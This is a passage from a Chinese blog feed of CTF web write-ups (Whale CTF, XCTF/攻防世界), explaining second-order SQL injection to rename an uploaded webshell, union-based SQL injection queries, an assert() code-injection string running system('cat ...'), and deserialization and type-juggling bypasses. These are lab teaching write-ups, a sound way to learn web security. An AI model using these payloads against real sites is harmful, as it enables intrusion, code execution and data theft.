href="#Session-固定攻击" class="headerlink" title="Session 固定攻击"></a>Session 固定攻击</h2><ul><li>用户使用了黑客发送的 session id，网站就不会给用户发送 session id</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码审计入门的小总结&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸安全打卡Web分析</title>
    <link href="http://yoursite.com/2019/06/01/%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/06/01/蓝鲸打卡Web分析/</id>
    <published>2019-05-31T18:37:38.581Z</published>
    <updated>2019-08-27T15:35:19.283Z</updated>
    
    <content type="html"><![CDATA[<p>蓝鲸打卡的一个 web 文件上传引发二次注入的题解和思考</p><a id="more"></a><h2 id="蓝鲸文件管理系统"><a href="#蓝鲸文件管理系统" class="headerlink" title="蓝鲸文件管理系统"></a>蓝鲸文件管理系统</h2><p>源代码地址：<a href="http://www.whaledu.com/course/290/task/2848/show" target="_blank" rel="noopener">http://www.whaledu.com/course/290/task/2848/show</a></p><p>首先在设置文件里把所有的输入都采用 <strong>addslashes()</strong> 函数进行转义</p><h3 id="upload-php关键代码"><a href="#upload-php关键代码" class="headerlink" title="upload.php关键代码"></a>upload.php关键代码</h3><p>将上传的文件通过pathinfo()函数分成三个部分，[dirname] [filename] [extension]</p><p>然后进行后缀名检查，拼接后进行addslashes转义，查询是否存在这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">    $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">   </span><br><span class="line">    $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">    $fetch = $db-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将文件名和后缀名插入数据库，将文件移动到相应文件夹并返回路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">        $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">        $re = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="rename-php关键代码"><a href="#rename-php关键代码" class="headerlink" title="rename.php关键代码"></a>rename.php关键代码</h3><p>查询旧文件是否存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更新filename，将oldname和newname重组，查询oldname是否存在，然后将文件的oldname更新为newname</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($result) &#123;       </span><br><span class="line"></span><br><span class="line">    $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">    $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">        print_r($db-&gt;errorInfo());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">        rename($oldname, $newname);</span><br><span class="line">        $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>在upload的过程中，全程进行转义并检测后缀，无法对上传进行操作，但是在rename的时候，没有对newname进行控制，这就可能会造成update的二次注入。</p><p>假设我们上传的文件是 1.jpg，然后进行改名，这个时候就会触发数据库的update语句</p><blockquote><p>update `file` set `filename`=’newname’, `oldname`=’1’ where `fid`=fid</p></blockquote><p>很明显，这里的newname和oldname都是我们可以控制的。</p><p>考虑上传问题，假设 1.jpg 是一句话木马，要把 1.jpg 变成 1.php，由于filename和extension分开操作，然后再合并，所有这里希望extension为空，这样在rename时可以将 1.jpg 变成 1.php。</p><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg</p><p><strong>解释：</strong></p><p>文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_1.PNG" alt></p><p>注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’</p><p>然后进行update，这时执行了构造的SQL语句，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_2.PNG" alt></p><p>注意这两行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br></pre></td></tr></table></figure><p>在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 <strong>1.jpg.jpg</strong></p><p>构造另外一个一句话木马文件1.jpg，上传，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_3.PNG" alt></p><p>再进行rename，传入的oldname为 1.jpg，newname为 1.php</p><p>进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’</p><p>在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;蓝鲸打卡的一个 web 文件上传引发二次注入的题解和思考&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="whale CTF" scheme="http://yoursite.com/tags/whale-CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web新手</title>
    <link href="http://yoursite.com/2019/06/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E6%96%B0%E6%89%8B/"/>
    <id>http://yoursite.com/2019/06/01/攻防世界Web新手/</id>
    <published>2019-05-31T18:37:38.580Z</published>
    <updated>2019-08-27T15:32:54.636Z</updated>
    
    <content type="html"><![CDATA[<p>攻防世界入门的题目</p><a id="more"></a><h3 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h3><p>禁用右键，F12审查元素</p><h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>hackbar进行post</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_1.PNG" alt></p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问</p><h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>备份文件一般是在后缀名后加.swp，.bak</p><p>本题尝试index.php.bak成功获取源码</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>burp抓包，发现提示，查看cookie.php，在响应头发现flag</p><p>火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_2.PNG" alt></p><h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>F12审查元素，找到按钮对应的代码，发现<strong>disabled=””</strong>，具体属性可以查看w3school，删除这个属性即可。</p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>拿到js源码，根据分析可以知道，函数 dechiffre(pass_enc) 的返回值与传入参数无关</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_3.PNG" alt></p><p>根据<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>，替换\x为%，再URLdecode一下，得到<code>55,56,54,79,115,69,114,116,107,49,50</code>，Firefox控制台运行一下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_4.PNG" alt></p><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>burp改包</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_5.PNG" alt></p><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>直接使用蚁剑</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_6.PNG" alt></p><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>关于命令执行，windows或linux下: </p><p>command1 &amp;&amp; command2 先执行command1后执行command2</p><p>command1 | command2 只执行command2 </p><p>command1 &amp; command2 先执行command2后执行command1</p><p>本题先使用ls不断遍历目录，查找flag，最后再读取</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_7.PNG" alt></p><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>看到源码，考察php弱类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>== 比较<br><strong>var_dump(‘a’ == 0)  //true</strong><br>a会被转化为数字0<br><strong>var_dump(‘1234a’ == 1234)  //true</strong><br>这里’1234a’会被转化为1234</p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。</p><p>在$a==$b的比较中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">' '</span>;$b=<span class="keyword">null</span>        <span class="comment">//true</span></span><br><span class="line">$a=<span class="keyword">null</span>;$b=<span class="keyword">true</span>      <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'0'</span>       <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'abcdef '</span>  <span class="comment">//true  而0===’abcdef '  false</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>F12常开着</li><li>burp常开着</li><li>试试访问robots.txt</li><li>备份文件一般是在后缀名后加.swp，.bak</li><li>蚁剑是有两个部分的，一个是启动程序，一个是源码</li><li>php的弱类型</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;攻防世界入门的题目&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web进阶</title>
    <link href="http://yoursite.com/2019/06/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E8%BF%9B%E9%98%B6/"/>
    <id>http://yoursite.com/2019/06/01/攻防世界Web进阶/</id>
    <published>2019-05-31T18:37:38.578Z</published>
    <updated>2019-08-27T15:34:40.319Z</updated>
    
    <content type="html"><![CDATA[<p>攻防世界 web 进阶题解</p><a id="more"></a><h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>纯脑洞题，注意题目描述，<strong>报表中心</strong></p><p>进入主页后，选择报表中心，发现URL有个id参数，爆破到id=2333即可</p><h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>一个搜索框，尝试注入</p><p>输入 ‘ 返回空白页面，输入 ‘ # 返回正常，确定为字符注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 3 # //确认select字段为3</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,3 # //确认1，2，3的位置</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 0,1) # //输出第一个库,INFORMATION_SCHEMA</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 1,1) #  //输出第二个库,news,这里试出来总共就2个库</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select table_name from information_schema.tables where table_schema=&apos;news&apos; limit 1,1) # //这里试出来secret_table表</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select column_name from information_schema.columns where table_name=&apos;secret_table&apos; limit 0,1) #  //这里试出来fl4g字段</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select fl4g from secret_table) #  //直接查询</span><br></pre></td></tr></table></figure><h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>打开About页面，发现提示，git，尝试git泄露，githack下载源码，放到Seay中</p><p>目录结构</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_1.PNG" alt></p><p>可能存在的漏洞</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_2.PNG" alt></p><p>在index.php页面发现危险函数<strong>assert()</strong>，eval与assert都算是元老级一句话后门函数</p><p>eval函数中参数是字符，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure><p>assert函数中参数为表达式 （或者为函数），如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo());</span><br><span class="line">assert(<span class="keyword">eval</span>(<span class="string">'echo 1;'</span>));</span><br></pre></td></tr></table></figure><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个assert检测传入参数，防止LFI，第二个assert检查文件是否存在</p><p>可以在assert中构造代码执行，即<strong>system(‘cat templates/flag.php’)</strong>，直接闭合strpos函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag"</span>;  <span class="comment">//第三步</span></span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag.php"</span>;  <span class="comment">//第二步</span></span><br><span class="line"></span><br><span class="line">assert(<span class="string">"strpos('templates/about.php','..') === false and system('cat templates/flag.php') and strpos('templates/flag.php', '..') === false"</span>);  <span class="comment">//第一步</span></span><br></pre></td></tr></table></figure><h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>下载附件，是一段js代码，后缀名改成html</p><p>最后的eval是执行函数，将eval改为console.log，向控制台输出一条消息</p><p>即可查看代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line"><span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line"><span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line"><span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>要求：</p><p>1、字符串长度16</p><p>2、以be0f23开头</p><p>3、以e98aa结尾</p><p>4、有233ac和c7be9</p><p>很容易拼接得到结果：be0f233ac7be98aa</p><h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p>访问index.phps，获取源码片段，别问怎么知道的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");   exit(); &#125;  $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "</span>admin<span class="string">") &#123;   echo "</span></span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line"><span class="string">";   echo "</span></span><br><span class="line"></span><br><span class="line">Key: xxxxxxx </span><br><span class="line"></span><br><span class="line"><span class="string">"; &#125; ?&gt;</span></span><br></pre></td></tr></table></figure><p>get一个参数id，id进行urldecode之后为admin，admin的url编码是%61%64%6D%69%6E，再进行一次url编码，为%2561%2564%256D%2569%256E，在index.php中提交。</p><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>在主页获取到部分代码，盲猜反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__wakeup()这个函数是在对象创建的时候执行的，也就是说在创建一个 xctf 对象时，就立刻退出了</p><p>绕过方法：使类的属性数量大于原来的就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = 